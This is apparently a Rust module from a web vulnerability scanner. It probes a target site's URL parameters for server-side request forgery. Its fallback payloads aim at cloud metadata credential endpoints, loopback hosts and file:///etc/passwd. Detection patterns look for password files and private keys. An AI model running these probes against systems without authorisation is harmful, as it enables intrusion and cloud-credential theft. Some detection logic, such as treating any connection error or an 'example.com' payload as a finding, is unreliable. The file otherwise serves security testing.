use crate::rate_limiter::RateLimiter;
use crate::reporter::Reporter;
use indicatif::ProgressBar;
use reqwest::Client;
use serde::Deserialize;
use std::collections::HashMap;
use std::collections::HashSet;
use std::sync::Arc;
use tokio::sync::Mutex;
use url::Url;

#[derive(Debug, Deserialize, Clone)]
pub struct SsrfVulnerability {
    pub url: Url,
    pub parameter: String,
    pub payload: String,
    pub vuln_type: String,
    pub severity: String,
    pub description: String,
}

pub struct SsrfScanner<'a> {
    target_url: Url,
    discovered_urls: Vec<Url>,
    payloads: Vec<String>,
    ssrf_params: Vec<String>,
    reporter: &'a Arc<Reporter>,
    rate_limiter: Arc<RateLimiter>,
    client: Client,
    found: HashSet<String>,
    callback_url: String,
    callback_results: Arc<Mutex<HashMap<String, Vec<String>>>>,
}

impl<'a> SsrfScanner<'a> {
    pub fn new(
        target_url: Url,
        discovered_urls: Vec<Url>,
        reporter: &'a Arc<Reporter>,
        rate_limiter: Arc<RateLimiter>,
        callback_url: String,
    ) -> Self {
        let payloads = Self::load_payloads("wordlists/ssrf/payloads.txt");
        let ssrf_params: Vec<String> = vec![
            "url",
            "src",
            "callback",
            "redirect",
            "uri",
            "path",
            "dest",
            "continue",
            "next",
            "data",
            "reference",
            "site",
            "html",
            "val",
            "validate",
            "domain",
            "return",
            "page",
            "feed",
            "host",
            "port",
            "to",
            "out",
            "view",
            "dir",
            "show",
            "navigation",
            "open",
            "file",
            "document",
            "folder",
            "pg",
            "style",
            "doc",
            "img",
            "source",
            "target",
            "cgi",
            "rm",
            "name",
            "a",
            "download",
            "w",
            "mode",
            "upload",
            "v",
            "format",
            "read",
            "gf",
            "page",
            "view",
            "action",
            "id",
            "campaign",
            "callback_url",
            "openurl",
            "fileurl",
            "pageurl",
            "geturl",
            "link",
            "go",
            "returnTo",
            "back",
            "exit",
            "viewPhoto",
        ]
        .into_iter()
        .map(String::from)
        .collect();

        Self {
            target_url,
            discovered_urls,
            payloads,
            ssrf_params,
            reporter,
            rate_limiter,
            client: Client::new(),
            found: HashSet::new(),
            callback_url,
            callback_results: Arc::new(Mutex::new(HashMap::new())),
        }
    }

    fn load_payloads(path: &str) -> Vec<String> {
        let mut payloads = Vec::new();
        if let Ok(content) = std::fs::read_to_string(path) {
            for line in content.lines() {
                let line = line.trim();
                if !line.is_empty() && !line.starts_with('#') {
                    payloads.push(line.to_string());
                }
            }
        }
        if payloads.is_empty() {
            payloads.extend([
                "http://127.0.0.1".to_string(),
                "http://localhost".to_string(),
                "http://127.1".to_string(),
                "http://0.0.0.0".to_string(),
                "http://[::1]".to_string(),
                "http://169.254.169.254/latest/meta-data/".to_string(),
                "http://169.254.169.254/latest/user-data/".to_string(),
                "http://metadata.google.internal/computeMetadata/v1/".to_string(),
                "file:///etc/passwd".to_string(),
            ]);
        }
        payloads
    }

    pub fn targets_count(&self) -> usize {
        let mut count = 0;
        for url in &self.discovered_urls {
            if let Some(query) = url.query() {
                count += query.split('&').count() * self.payloads.len();
            }
            count += self.ssrf_params.len() * self.payloads.len();
        }
        count
    }

    pub async fn scan(
        &mut self,
        pb: &ProgressBar,
    ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
        println!("Starting SSRF scan...");

        self.test_existing_params(pb).await?;
        self.test_common_params(pb).await?;

        self.report_callback_findings().await;

        pb.finish_with_message("SSRF scan complete.");
        Ok(())
    }

    async fn test_existing_params(
        &mut self,
        pb: &ProgressBar,
    ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
        let urls: Vec<Url> = self.discovered_urls.clone();
        let payloads: Vec<String> = self.payloads.clone();

        for base_url in urls {
            if let Some(query) = base_url.query() {
                let params: HashMap<String, String> = query
                    .split('&')
                    .filter_map(|pair| {
                        let mut parts = pair.splitn(2, '=');
                        match (parts.next(), parts.next()) {
                            (Some(k), Some(v)) => Some((k.to_string(), v.to_string())),
                            (Some(k), None) => Some((k.to_string(), String::new())),
                            _ => None,
                        }
                    })
                    .collect();

                for param_name in params.keys() {
                    for payload in &payloads {
                        pb.set_message(format!(
                            "Testing SSRF: {}?{}={}",
                            base_url, param_name, payload
                        ));

                        self.test_parameter(&base_url, param_name, payload, pb)
                            .await?;
                        pb.inc(1);
                    }
                }
            }
        }
        Ok(())
    }

    async fn test_common_params(
        &mut self,
        pb: &ProgressBar,
    ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
        let urls: Vec<Url> = self.discovered_urls.clone();
        let ssrf_params: Vec<String> = self.ssrf_params.clone();
        let payloads: Vec<String> = self.payloads.clone();

        for base_url in urls {
            for param_name in &ssrf_params {
                for payload in &payloads {
                    let test_url = format!("{}?{}={}", base_url, param_name, payload);

                    pb.set_message(format!(
                        "Testing SSRF: {}?{}={}",
                        base_url, param_name, payload
                    ));

                    if let Ok(url) = Url::parse(&test_url) {
                        self.test_parameter(&url, param_name, payload, pb).await?;
                    }
                    pb.inc(1);
                }
            }
        }
        Ok(())
    }

    async fn test_parameter(
        &mut self,
        url: &Url,
        param_name: &str,
        payload: &str,
        _pb: &ProgressBar,
    ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
        self.rate_limiter.wait().await;

        let finding_key = format!("{}:{}:{}", url, param_name, payload);
        if self.found.contains(&finding_key) {
            return Ok(());
        }

        let path = url.path();
        let _query = url.query().map(|q| format!("?{}", q)).unwrap_or_default();
        let test_url = format!(
            "{}{}?{}={}",
            path,
            if path.ends_with('/') { "" } else { "/" },
            param_name,
            payload
        );

        let full_url = self
            .target_url
            .join(&test_url)
            .unwrap_or_else(|_| url.clone());

        let response = match self.client.get(full_url.as_str()).send().await {
            Ok(resp) => resp,
            Err(e) => {
                if e.is_connect() || e.is_timeout() {
                    let vuln = SsrfVulnerability {
                        url: self.target_url.clone(),
                        parameter: param_name.to_string(),
                        payload: payload.to_string(),
                        vuln_type: "Potential SSRF (Connection Failed)".to_string(),
                        severity: "Medium".to_string(),
                        description: format!(
                            "Payload '{}' caused connection error: {}. This may indicate SSRF.",
                            payload, e
                        ),
                    };
                    self.reporter.report_ssrf(&vuln);
                    self.found.insert(finding_key);
                }
                return Ok(());
            }
        };

        let status = response.status();
        let body = response.text().await.unwrap_or_default();

        let is_internal = self.detect_internal_content(&body, &status);
        let is_cloud = self.detect_cloud_metadata(&body, payload);
        let is_callback = self.detect_callback(payload);

        if is_internal || is_cloud {
            let vuln_type = if is_cloud {
                "Cloud Metadata SSRF"
            } else {
                "Internal Resource SSRF"
            };
            let severity = if is_cloud { "Critical" } else { "High" };

            let vuln =
                SsrfVulnerability {
                    url: self.target_url.clone(),
                    parameter: param_name.to_string(),
                    payload: payload.to_string(),
                    vuln_type: vuln_type.to_string(),
                    severity: severity.to_string(),
                    description: format!(
                    "Payload '{}' accessed {}. Response: {} bytes, Status: {}. Body preview: {}",
                    payload,
                    if is_cloud { "cloud metadata service" } else { "internal resource" },
                    body.len(),
                    status.as_u16(),
                    &body[..std::cmp::min(200, body.len())]
                ),
                };
            self.reporter.report_ssrf(&vuln);
            self.found.insert(finding_key);
        } else if is_callback {
            let vuln = SsrfVulnerability {
                url: self.target_url.clone(),
                parameter: param_name.to_string(),
                payload: payload.to_string(),
                vuln_type: "Blind SSRF (OOB)".to_string(),
                severity: "High".to_string(),
                description: format!(
                    "Payload '{}' may have triggered a callback. Check callback server for incoming requests.",
                    payload
                ),
            };
            self.reporter.report_ssrf(&vuln);
            self.found.insert(finding_key);
        }

        Ok(())
    }

    fn detect_internal_content(&self, body: &str, status: &reqwest::StatusCode) -> bool {
        let internal_indicators = [
            "root:x:0:0:",
            "/etc/passwd",
            "/etc/shadow",
            "internal",
            "localhost",
            "127.0.0.1",
            "::1",
            "private key",
            "BEGIN RSA PRIVATE KEY",
            "BEGIN OPENSSH PRIVATE KEY",
            "Windows",
            "Program Files",
        ];

        for indicator in &internal_indicators {
            if body.contains(indicator) {
                return true;
            }
        }

        if status.as_u16() == 200 && body.contains("ami-id") || body.contains("instance-id") {
            return true;
        }

        false
    }

    fn detect_cloud_metadata(&self, body: &str, payload: &str) -> bool {
        let cloud_indicators = [
            "ami-id",
            "instance-id",
            "local-hostname",
            "public-hostname",
            "public-keys",
            "security-credentials",
            "cloud-user-data",
            "computeMetadata",
            "googleusercontent",
            "metadata.google",
        ];

        let payload_lower = payload.to_lowercase();

        if payload_lower.contains("169.254.169.254") || payload_lower.contains("metadata.google") {
            for indicator in &cloud_indicators {
                if body.contains(indicator) {
                    return true;
                }
            }
        }

        false
    }

    fn detect_callback(&self, payload: &str) -> bool {
        payload.contains("callback")
            || payload.contains("requestbin")
            || payload.contains("burpcollaborator")
            || payload.contains("interactsh")
            || payload.contains("localhost:")
            || payload.contains("example.com")
    }

    #[allow(dead_code)]
    pub async fn register_callback(&self, payload: String) {
        let mut results = self.callback_results.lock().await;
        results
            .entry("incoming".to_string())
            .or_insert_with(Vec::new)
            .push(payload);
    }

    async fn report_callback_findings(&self) {
        let results = self.callback_results.lock().await;
        if !results.is_empty() {
            println!("\n[*] Callback results: {:?}", results);
        }
    }

    pub fn get_callback_url(&self) -> String {
        self.callback_url.clone()
    }
}
